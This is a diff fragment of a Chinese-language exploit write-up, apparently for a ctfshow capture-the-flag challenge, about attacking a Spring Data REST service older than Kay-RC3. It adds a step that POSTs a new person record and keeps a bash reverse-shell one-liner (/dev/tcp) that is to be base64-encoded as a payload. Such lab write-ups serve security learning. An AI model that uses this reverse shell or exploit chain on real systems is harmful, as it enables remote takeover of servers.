@@ -18,6 +18,11 @@ Spring Data release trains < Kay-RC3
 ```
 
 漏洞利用
+先POST如下新增一个用户，用户id第一个就是1
+```
+POST /api/people/ HTTP/1.1
+{"fistName":"ctfshow","lastName":"nb"}
+```
 ```
 bash -i >& /dev/tcp/ip/port 0>&1
 base64一下：
